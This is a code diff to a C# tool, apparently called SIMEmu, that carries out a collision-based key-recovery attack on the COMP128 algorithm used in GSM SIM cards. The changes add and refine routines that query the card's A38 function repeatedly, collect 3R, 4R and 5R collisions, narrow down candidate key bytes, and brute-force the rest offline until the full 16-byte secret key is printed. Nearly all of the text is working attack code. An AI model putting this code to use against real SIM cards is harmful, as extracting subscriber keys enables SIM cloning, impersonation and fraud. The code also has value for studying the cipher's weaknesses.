@@ -59,9 +59,10 @@ namespace SIMEmu
 
             Rand = new byte[16];
             start_pos = new byte[4];
-            kid = 1;
+            kid = 0;
             hashes = new Dictionary<ulong, uint>();
         }
+        #region framework, IO stuff
         public bool InitNewSession(string sessionfile)
         {
             try
@@ -137,32 +138,47 @@ namespace SIMEmu
             worker.Join();
             session.Close();
         }
-
-        private long Get3RCollisionProbability(long R0, long R1)
+        public void Collect()
         {
-            long p = 1;
-            for (int i = 0; i < 8; i++)
+            long t0, t;
+            t0 = t = System.Environment.TickCount;
+            int c0 = hashes.Count;
+
+            byte[] r = new byte[12];
+            Console.WriteLine();
+            while (!stopping)
             {
-                int r0 = (int)(R0 & 0x3F); R0 >>= 6;
-                int r1 = (int)(R1 & 0x3F); R1 >>= 6;
-                if (r0 == r1) //Collision at 3R gives 100% contribution
+                if (System.Environment.TickCount - t > 250)
                 {
-                    p *= (1 << 6);
-                    continue;
+                    t = System.Environment.TickCount;
+                    Console.Write(String.Format("\rObtained {0:d8} hashes. Speed: {1:F2} op/sec",
+                        hashes.Count, (hashes.Count - c0) / ((t - t0) / 1000.0))
+                        );
                 }
-                int denom = 0;
-                for (int r2 = 0; r2 < (1 << 6); r2++)
+                for (int i = 0; i < 4; i++)
+                    Rand[kid + 4 * i] = start_pos[i];
+
+                if (!comp128.A38(Rand, r)) break;
+
+                ulong k = Pack8Bytes(r);
+                uint v = Pack4Bytes(start_pos[0], start_pos[1], start_pos[2], start_pos[3]);
+                if (!hashes.ContainsKey(k))
+                    hashes[k] = v;
+                else
                 {
-                    int t0 = r0, t1 = r1, t0_ = r2, t1_ = r2;
-                    Comp128.swap(ref t0, ref t0_, 3);
-                    Comp128.swap(ref t1, ref t1_, 3);
-                    if ((t0 == t1) && (t0_ == t1_)) denom++;
+                    Console.WriteLine();
+                    Console.WriteLine(String.Format("Collision detected after {0} steps.", hashes.Count));
+                    Solve3RCollision(hashes[k], Pack4Bytes(start_pos[0], start_pos[1], start_pos[2], start_pos[3]));
+                    break;
                 }
-                if (denom == 0) return 0;
-                p *= denom ;
+                session.Write(r, 0, r.Length);
+                for (int i = 0; i < 4; i++) session.WriteByte(start_pos[i]);
+                session.Flush();
+
+                IncrementStartPos();
             }
-            return p;
         }
+        #endregion
 
         Dictionary<int, int>[] blacklist_rand = new Dictionary<int, int>[65536];
         private bool is_rand_blacklisted(int k0, int k8, int r0, int r8)
@@ -241,28 +257,6 @@ namespace SIMEmu
                     }
                 }
             return false;
-            //r0 = r1 = 0;
-            //Dictionary<ulong, uint> seen = new Dictionary<ulong, uint>();
-            //Random prng = new Random();
-            //byte[] r = new byte[4];
-            //uint r_int = 0;
-            //while(true){
-            //    r[3] = (byte)(r_int >> 0);
-            //    r[2] = (byte)(r_int >> 8);
-            //    r[1] = (byte)(r_int >> 16);
-            //    r[0] = (byte)(r_int >> 24);
-            //    if (is_rand_blacklisted(k0, k8, r[0], r[2]) || is_rand_blacklisted(k4, k12, r[1], r[3])) { r_int++; continue; }
-            //    ulong h = (ulong)Comp128.Compute3R(k0, k4, k8, k12, r[0], r[1], r[2], r[3]);
-            //    if (seen.ContainsKey(h) && seen[h] != r_int)
-            //    {
-            //        r0 = Pack4Bytes((byte)(seen[h] >> 24), (byte)(seen[h] >> 16), (byte)(seen[h] >> 8), (byte)(seen[h] >> 0));
-            //        r1 = Pack4Bytes((byte)(r_int >> 24), (byte)(r_int >> 16), (byte)(r_int >> 8), (byte)(r_int >> 0));
-            //        return true;
-            //    }
-            //    else
-            //        seen[h] = r_int;
-            //    r_int++;
-            //}
         }
         public void Solve3RCollision(uint R0, uint R1)
         {
@@ -293,7 +287,7 @@ namespace SIMEmu
                             ));
                 K412.Sort(new IntComparer<KeyValuePair<int, long>>(v => HammingDistance.long_hamming(v.Value)));
 
-                //Find probability of 3R/4R collisions of every quadruple Ri
+                //Could Eliminate this: Find probability of 3R/4R collisions of every quadruple Ri
                 List<KeyValuePair<int, long>> K412P = new List<KeyValuePair<int, long>>();
                 foreach (var k412 in K412)
                 {
@@ -304,9 +298,9 @@ namespace SIMEmu
                     long diff = ThreeR0 ^ ThreeR1;
                     if (HammingDistance.long_hamming(diff) > 6) break;
                     if (HammingDistance.long_hamming(diff) > 3) continue;
-                    long p = Get3RCollisionProbability(ThreeR0, ThreeR1);
-                    if (p == 0) continue;
-                    K412P.Add(new KeyValuePair<int, long>((k4 << 8) | k12, p));
+                    //long p = Get3RCollisionProbability(ThreeR0, ThreeR1);
+                    //if (p == 0) continue;
+                    K412P.Add(new KeyValuePair<int, long>((k4 << 8) | k12, k412.Value));
                 }
                 if (K412P.Count > 0)
                     Console.WriteLine(String.Format("Found {0} candidate keys.", K412P.Count));
@@ -350,7 +344,7 @@ namespace SIMEmu
                 if (K412R.Count == 1)
                 {
                     int k412r = K412R.Find(x => true).Key;
-                    if (Attack4R(k0, k412r >> 8, k8, k412r & 0xFF)) return;
+                    Attack4R(k0, k412r >> 8, k8, k412r & 0xFF);
                 }
             }
         }
@@ -363,8 +357,10 @@ namespace SIMEmu
             uint[] r1 = new uint[4];
             long mask = ~((long)0x3F << (6*offset));
             List<ulong> result = new List<ulong>();
-            foreach (var r08 in find_2rpc_pair(k0, k8, offset / 2))
-                foreach (var r412 in find_2rpc_pair(k4, k12, offset / 2))
+            var R08 = find_2rpc_pair(k0, k8, offset / 2);
+            var R412 = find_2rpc_pair(k4, k12, offset / 2);
+            foreach (var r08 in R08)
+                foreach (var r412 in R412)
                 {
                     uint r0_8 = r08 & 0xFF;
                     uint r0_0 = (r08 >> 8) & 0xFF;
@@ -405,20 +401,21 @@ namespace SIMEmu
         }
 
         //Return all possible ki quadruples whose 3R computation gives b at offset
-        //The trick is to undo 1 level 3 swap operation, the required result is just a cartesian product of 
+        //The trick is to undo 1 level 3 swap operation, the required result is just a Cartesian product of 
         //matching (K0,K8) and (K4, K12). Complexity reduced from 2^32 to 2^26
-        byte[,] get_candidates_from_3r_byte(int r0, int r4, int r8, int r12, int b, int offset)
+        byte[,] get_candidates_from_3r_byte(int[] r0, int[] r4, int[] r8, int[] r12, int r_count, int b, int offset)
         {
             List<int> r = new List<int>();
-            var R08 = Enumerable.Range(0, 65536).Select(x => new KeyValuePair<int, int>(x, Comp128.Compute2R((x >> 8) &0xFF, x&0xFF, r0, r8))).ToList();
-            var R412 = Enumerable.Range(0, 65536).Select(x => new KeyValuePair<int, int>(x, Comp128.Compute2R((x >> 8) &0xFF, x&0xFF, r4, r12))).ToList();
+            var R08 = Enumerable.Range(0, 65536).Select(x => new KeyValuePair<int, int>(x, Comp128.Compute2R((x >> 8) &0xFF, x&0xFF, r0[0], r8[0]))).ToDictionary(k => k.Key, v => v.Value);
+            var R412 = Enumerable.Range(0, 65536).Select(x => new KeyValuePair<int, int>(x, Comp128.Compute2R((x >> 8) & 0xFF, x & 0xFF, r4[0], r12[0]))).ToDictionary(k => k.Key, v => v.Value);
             List<KeyValuePair<int, int>>[] filtered_R08 = new List<KeyValuePair<int, int>>[1 << 7];
             List<KeyValuePair<int, int>>[] filtered_R412 = new List<KeyValuePair<int, int>>[1 << 7];
-            int shift_bits = (7 * (offset / 2));
+            int shift_bits_2R = (7 * (offset / 2));
+            int shift_bits_3R = (6 * offset );
             for (int i = 0; i < (1 << 7); i++)
             {
-                filtered_R08[i] = R08.Where(x => i == ((x.Value >> shift_bits) & 0x7F)).ToList();
-                filtered_R412[i] = R412.Where(x => i == ((x.Value >> shift_bits) & 0x7F)).ToList();
+                filtered_R08[i] = R08.Where(x => i == ((x.Value >> shift_bits_2R) & 0x7F)).ToList();
+                filtered_R412[i] = R412.Where(x => i == ((x.Value >> shift_bits_2R) & 0x7F)).ToList();
             }
 
             for (int a0 = 0; a0 < (1 << 7); a0++) //undo swap such that swap(a0,a1) => swap(b0, b1)
@@ -428,10 +425,20 @@ namespace SIMEmu
                     Comp128.swap(ref ta0, ref ta1, 2);
                     if (   ((offset % 2 == 1) && (ta0 != b))  //a0 matches b if offset is odd
                         || ((offset % 2 == 0) && (ta1 != b))  ) continue;
-                    //Now need to produce the cartesian product of K08 whose value at offset is a0, and K412 whose value at offset is a1
+                    //Now need to produce the Cartesian product of K08 whose value at offset is a0, and K412 whose value at offset is a1
                     foreach (var k08 in filtered_R08[a0])
                         foreach (var k412 in filtered_R412[a1])
+                        {
+                            bool bad = false;
+                            //Need to check if this satisfies r0,4,8,12[1..end] as well
+                            for (int j = 1; j < r_count; j++)
+                            {
+                                long x = Comp128.Compute3R(k08.Key >> 8, k412.Key >> 8, k08.Key & 0xFF, k412.Key & 0xFF, r0[j], r4[j], r8[j], r12[j]);
+                                if (((x >> shift_bits_3R) & 0x3F) != b) { bad = true; break; }
+                            }
+                            if (bad) continue;
                             r.Add((k08.Key << 16) | k412.Key);
+                        }
                 }
 
             byte[,] result = new byte[r.Count, 4];
@@ -447,20 +454,6 @@ namespace SIMEmu
                 c++;
             }
             return result;
-            //long x;
-            //for (int k2 = 0; k2 <= 0xFF; k2++)
-            //    for (int k6 = 0; k6 <= 0xFF; k6++)
-            //    {
-            //        Console.Write(String.Format("\r {0}/65536", k2 * 256 + k6));
-            //        for (int k10 = 0; k10 <= 0xFF; k10++)
-            //            for (int k14 = 0; k14 <= 0xFF; k14++)
-            //            {
-            //                x = Comp128.Compute3R(k2, k6, k10, k14, r2, r6, r10, r14);
-            //                if (((int)(x >> (6 * offset)) & 0x3F) == intermediate_r)
-            //                    candidates.Add(new byte[] { (byte)k2, (byte)k6, (byte)k10, (byte)k14 });
-            //            }
-            //    }
-
         }
         //By constructing appropriate 3R partial collisions, induce 4R collision probabilistically. 
         //If 4R collision is detected, one byte (6bits) of the state of the cipher after 3R can be determined.
@@ -473,6 +466,12 @@ namespace SIMEmu
             byte[] test_rst1 = new byte[12];
             byte[] r0 = new byte[4];
             byte[] r1 = new byte[4];
+
+            int[] r2 = new int[13];
+            int[] r6 = new int[13];
+            int[] r10 = new int[13];
+            int[] r14 = new int[13];
+            int collected_count = 0; 
             byte[,] candidates = null;  //This can be huge (2^26). Need plain array to save memory.
             Random prng = new Random();
             int a38_count = 0;
@@ -488,7 +487,7 @@ namespace SIMEmu
                     int intermediate_r = is_usable_4RCollision((int)(rr0 >> (6 * offset)) & 0x3F, (int)(rr1 >> (6 * offset)) & 0x3F);
                     if (intermediate_r < 0) continue;
                     Console.Write(".");
-                    for (int c = 0; c < (1 << 10); c++) //Try to obtain 4R collision probabilistically with p = 1/(1<<6)
+                    for (int c = 0; c < (1 << 20); c++) //Try to obtain 4R collision probabilistically with p = 1/(1<<6)
                     {
                         prng.NextBytes(test_r);
                         Unpack4Bytes((uint)rpc, ref test_r[kid], ref test_r[kid + 4], ref test_r[kid + 8], ref test_r[kid + 12]);
@@ -501,12 +500,17 @@ namespace SIMEmu
                         {
                             Console.WriteLine(String.Format("Found 4R collision after {0} A38 invocations.", a38_count));
                             a38_count = 0;
-                            byte r2 = test_r[kid + 2], r6 = test_r[kid + 6], r10 = test_r[kid + 10], r14 = test_r[kid + 14];
-                            //long x = Comp128.Compute3R(0xAA, 0x9F, 0x05, 0x28, test_r[kid + 2], test_r[kid + 6], test_r[kid + 10], test_r[kid + 14]);
-                            //int y = (int)(x >> (6 * offset)) & 0x3F;
+                            r2[collected_count] = test_r[kid + 2];
+                            r6[collected_count] = test_r[kid + 6];
+                            r10[collected_count] = test_r[kid + 10];
+                            r14[collected_count] = test_r[kid + 14];
+                            collected_count++;
+//long x = Comp128.Compute3R(0xAA, 0x9F, 0x05, 0x28, test_r[kid + 2], test_r[kid + 6], test_r[kid + 10], test_r[kid + 14]);
+//int y = (int)(x >> (6 * offset)) & 0x3F;
                             if (candidates == null) //First time is slow
                             {
-                                candidates = get_candidates_from_3r_byte(r2, r6, r10, r14, intermediate_r, offset);
+                                if (collected_count < 2) continue;
+                                candidates = get_candidates_from_3r_byte(r2, r6, r10, r14, collected_count, intermediate_r, offset);
                                 Console.WriteLine(String.Format("Obtained {0} candidates.", candidates.GetLength(0)));
                                 break;
                             }
@@ -516,10 +520,12 @@ namespace SIMEmu
                                 List<byte[]> c2 = new List<byte[]>();
                                 for (int i = 0; i < candidates.GetLength(0); i++)
                                 {
-                                    long x = Comp128.Compute3R(candidates[i, 0], candidates[i, 1], candidates[i, 2], candidates[i, 3], r2, r6, r10, r14);
+                                    long x = Comp128.Compute3R(candidates[i, 0], candidates[i, 1], candidates[i, 2], candidates[i, 3],
+                                            r2[collected_count - 1], r6[collected_count - 1], r10[collected_count - 1], r14[collected_count - 1]);
                                     if (((int)(x >> (6 * offset)) & 0x3F) == intermediate_r)
                                         c2.Add(new byte[] { candidates[i, 0], candidates[i, 1], candidates[i, 2], candidates[i, 3] });
                                 }
+                                if (candidates.GetLength(0) == c2.Count) break; //Try another 4R collision
                                 candidates = new byte[c2.Count, 4];
                                 int j = 0;
                                 foreach (var x in c2)
@@ -530,9 +536,12 @@ namespace SIMEmu
                                 Console.WriteLine(String.Format("Refined to {0} candidates.", candidates.GetLength(0)));
                                 if (candidates.GetLength(0) == 1)
                                 {
-                                    Console.WriteLine(String.Format("4R Key: {4:X2} {0:X2} {5:X2} {1:X2} {6:X2} {2:X2} {7:X2} {3:X2}",
-                                        new object[] { candidates[0, 0], candidates[0, 1], candidates[0, 2], candidates[0, 3], k0, k4, k8, k12 }));
-                                    return true;
+                                    Console.WriteLine(String.Format("4R Key: {8} {4:X2} ?? {0:X2} ?? {5:X2} ?? {1:X2} ?? {6:X2} ?? {2:X2} ?? {7:X2} ?? {3:X2} {9}",
+                                        new object[] { candidates[0, 0], candidates[0, 1], candidates[0, 2], candidates[0, 3], 
+                                                         k0, k4, k8, k12,
+                                                        (kid == 0) ? "" : "??", 
+                                                        (kid == 0) ? "??" : ""}));
+                                    return true;// Attack5R(new int[] { k0, candidates[0, 0], k4, candidates[0, 1], k8, candidates[0, 2], k12, candidates[0, 3] });
                                 }
                                 else if (candidates.GetLength(0) == 0)
                                 {
@@ -546,46 +555,173 @@ namespace SIMEmu
             }
             return true;
         }
-        public void Collect()
+
+        //k[] has 8 elements, mapping to k0,2,4,6,8,10,12,14
+        private IEnumerable<byte[]> find_4rpc_pair(int[] k, int offset)
         {
-            long t0, t;
-            t0 = t = System.Environment.TickCount;
-            int c0 = hashes.Count;
-
-            byte[] r = new byte[12];
-            Console.WriteLine();
-            while (!stopping)
-            {
-                if (System.Environment.TickCount - t > 250)
+            //int pk = (k0 << 8) | k8;
+            //if (cache_2rpc.ContainsKey(pk)) return cache_2rpc[pk];
+            byte[] r0 = new byte[8]; //r0, r2, r4, r6, r8, r10, r12
+            byte[] r1 = new byte[8]; //same as r0, which makes up the pair
+            int[] x = new int[16];
+            int[] y = new int[16];
+            long mask = ~((long)0x1F << (5 * offset));
+            //List<byte[]> result = new List<byte[]>();
+            var R04 = find_3rpc_pair(k[0], k[2], k[4], k[6], offset / 2);//r0, 4, 8, 12
+            var R26 = find_3rpc_pair(k[1], k[3], k[5], k[7], offset / 2);//r2, 6, 10, 14
+            foreach (var r04 in R04) 
+                foreach (var r26 in R26)
                 {
-                    t = System.Environment.TickCount;
-                    Console.Write(String.Format("\rObtained {0:d8} hashes. Speed: {1:F2} op/sec", 
-                        hashes.Count, (hashes.Count - c0)/((t - t0) / 1000.0))
-                        );
+                    Unpack4Bytes((uint)r04, ref r0[0], ref r0[2], ref r0[4], ref r0[6]);
+                    Unpack4Bytes((uint)r26, ref r0[1], ref r0[3], ref r0[5], ref r0[7]);
+                    Unpack4Bytes((uint)(r04 >> 32), ref r1[0], ref r1[2], ref r1[4], ref r1[6]);
+                    Unpack4Bytes((uint)(r26 >> 32), ref r1[1], ref r1[3], ref r1[5], ref r1[7]);
+                    Comp128.Compute4R(k, r0, x);
+                    Comp128.Compute4R(k, r1, y);
+                    bool match = true;
+                    for (int i = 0; i <= (offset | 1);i++ )
+                        if ((i != offset) && (x[i] != y[i])) { match = false; break; }
+                    if (match)
+                    {
+                        byte[] r_item = new byte[16];
+                        r0.CopyTo(r_item, 0);
+                        r1.CopyTo(r_item, 8);
+                        //result.Add(r_item);
+                        yield return r_item;
+                    }
                 }
-                for (int i = 0; i < 4;i++)
-                    Rand[kid + 4 * i] = start_pos[i];
-
-                if (!comp128.A38(Rand, r)) break;
-                
-                ulong k = Pack8Bytes(r);
-                uint v = Pack4Bytes(start_pos[0], start_pos[1], start_pos[2], start_pos[3]);
-                if (!hashes.ContainsKey(k))
-                    hashes[k] = v;
-                else
-                {
-                    Console.WriteLine();
-                    Console.WriteLine(String.Format("Collision detected after {0} steps.", hashes.Count));
-                    Solve3RCollision(hashes[k], Pack4Bytes(start_pos[0], start_pos[1], start_pos[2], start_pos[3]));
-                    break;
-                }
-                session.Write(r, 0, r.Length);
-                for (int i = 0; i < 4; i++) session.WriteByte(start_pos[i]);
-                session.Flush();
-
-                IncrementStartPos();
-            }
+            //return result;
         }
+
+        //5R collision is defined Useful if there exists only one Y such that swap(x0, Y) == swap(x1, Y)
+        private int is_usable_5RCollision(int x0, int x1)
+        {
+            int r = -1;
+            for (int y = 0; y < (1 << 5); y++)
+            {
+                int x0_ = x0, x1_ = x1, y0 = y, y1 = y;
+                Comp128.swap(ref x0_, ref y0, 4);
+                Comp128.swap(ref x1_, ref y1, 4);
+                if (x0_ == x1_ && y0 == y1)
+                    if (r != -1)
+                        return -1;
+                    else
+                        r = y;
+            }
+            return r;
+        }
+
+        private void bruteforce_from_4r_byte(int[][] r, int r_count, int b, int offset, int[] known_keys, byte[] test_vector, byte[] test_r)
+        {
+            for (int i = 0; i < r_count; i++)
+            {
+                int[] R = new int[16];
+                Comp128.Compute4R(new int[] { 0x03, 0xE1, 0xA5, 0xA1, 0xBA, 0x42, 0x8B, 0xBF },
+                                    new byte[] { (byte)r[0][i], (byte)r[1][i], (byte)r[2][i], (byte)r[3][i], (byte)r[4][i], (byte)r[5][i], (byte)r[6][i], (byte)r[7][i] },
+                                    R);
+            }
+            Console.WriteLine("Brute forcing the final 8 bytes offline, could take a while..");
+            Comp128 test = new Comp128();
+            byte[] test_key = new byte[16];
+            for (int a0 = 0; a0 < (1 << 6); a0++) //undo swap such that swap(a0,a1) => swap(b0, b1)
+                for (int a1 = 0; a1 < (1 << 6); a1++)
+                {
+                    Console.Write(String.Format("\r{0}/{1}: -", a0 * (1 << 6) + a1, 1 << 12));
+                    int ta0 = a0, ta1 = a1;
+                    Comp128.swap(ref ta0, ref ta1, 3);
+                    if (((offset % 2 == 1) && (ta0 != b))  //a0 matches b if offset is odd
+                        || ((offset % 2 == 0) && (ta1 != b))) continue;
+                    //Now need to produce the Cartesian product of 3r_candidates
+                    var K02 = get_candidates_from_3r_byte(r[0], r[2], r[4], r[6], r_count, a0, offset / 2);
+                    Console.Write("\b*-");
+                    if (K02.GetLength(0) == 0) continue;
+                    var K13 = get_candidates_from_3r_byte(r[1], r[3], r[5], r[7], r_count, a1, offset / 2);
+                    Console.Write("\b*");
+                    for (int i = 0; i < K02.GetLength(0); i++)
+                        for (int j = 0; j < K13.GetLength(0); j++)
+                        {
+                            Console.Write(".");
+                            for (int k = 0; k < 4; k++)
+                            {
+                                test_key[(kid + 1) % 2 + 4 * k] = K02[i, k];
+                                test_key[(kid + 1) % 2 + 4 * k + 2] = K13[j, k];
+                            }
+                            for (int k = 0; k < 8; k++)
+                                test_key[kid + k * 2] = (byte)known_keys[k];
+                            test.setkey(test_key);
+                            byte[] test_result = test.A3A8(test_vector, false);
+                            if (Pack8Bytes(test_result) == Pack8Bytes(test_r))
+                            {
+                                Console.Write("Found Full Key: ");
+                                for (int k = 0; k < 16; k++)
+                                    Console.Write(String.Format("{0:X2} ", test_key[k]));
+                                Console.WriteLine();
+                                return;
+                            }
+                        }
+                }
+
+        }
+        //Similar thing as 4R, but now we are attacking 8 kis at a time, which needs more cleverness.
+        public bool Attack5R(int[] k)
+        {
+            Console.WriteLine("5R Attack..");
+            byte[] test_r = new byte[16];
+            byte[] test_rst0 = new byte[12];
+            byte[] test_rst1 = new byte[12];
+
+            int[][] collide_r = new int[8][];
+            for(int i=0;i<8;i++) collide_r[i] = new int[100];
+            int collected_count = 0;
+            Random prng = new Random();
+            int a38_count = 0;
+            int offset = 0; 
+            Console.Write(String.Format("Trying 4RPC at offset {0}: ", offset));
+            foreach (var rpc in find_4rpc_pair(k, offset))
+            { //rpc[0..7] and rpc[8..15] are the pair that causes 2RPC
+                byte[] r0 = new byte[8]; Array.Copy(rpc, 0, r0, 0, 8);
+                byte[] r1 = new byte[8]; Array.Copy(rpc, 8, r1, 0, 8);
+                int[] rr0 = new int[16];
+                int[] rr1 = new int[16];
+                Comp128.Compute4R(k, r0, rr0);
+                Comp128.Compute4R(k, r1, rr1);
+                int intermediate_r = is_usable_5RCollision(rr0[offset], rr1[offset]);
+                if (intermediate_r < 0) continue;
+                Console.Write(".");
+                int fruitless_tries = 0;
+                while(true) //Try to obtain 5R collision probabilistically with p = 1/(1<<6)
+                {
+                    prng.NextBytes(test_r);
+                    for (int i = 0; i < 8; i++) test_r[kid + 2 * i] = r0[i];
+                    comp128.A38(test_r, test_rst0);
+                    for (int i = 0; i < 8; i++) test_r[kid + 2 * i] = r1[i];
+                    comp128.A38(test_r, test_rst1);
+                    a38_count += 2;
+                    bool collide = (Pack8Bytes(test_rst0) == Pack8Bytes(test_rst1));
+                    if (collide) //Obtain 5 bits of information, collect a few of them then bruteforce.
+                    {
+                        fruitless_tries = 0;
+                        Console.WriteLine(String.Format("Found 4R collision after {0} A38 invocations.", a38_count));
+                        a38_count = 0;
+                        for (int i = 0; i < 8; i++) collide_r[i][collected_count] = test_r[(kid + 1) % 2 + 2 * i];
+                        collected_count++;
+                        //long x = Comp128.Compute3R(0xAA, 0x9F, 0x05, 0x28, test_r[kid + 2], test_r[kid + 6], test_r[kid + 10], test_r[kid + 14]);
+                        //int y = (int)(x >> (6 * offset)) & 0x3F;
+                        if (collected_count < 8) continue;
+                        bruteforce_from_4r_byte(collide_r, collected_count, intermediate_r, offset, k, test_r, test_rst1);
+                        //Console.WriteLine(String.Format("Obtained {0} candidates.", candidates.GetLength(0)));
+                        return true;
+                    }
+                    else
+                    {
+                        fruitless_tries++;
+                        if (fruitless_tries > 4096) break;
+                    }
+                }
+            }
+            return false;
+        }
+
     }
 
 
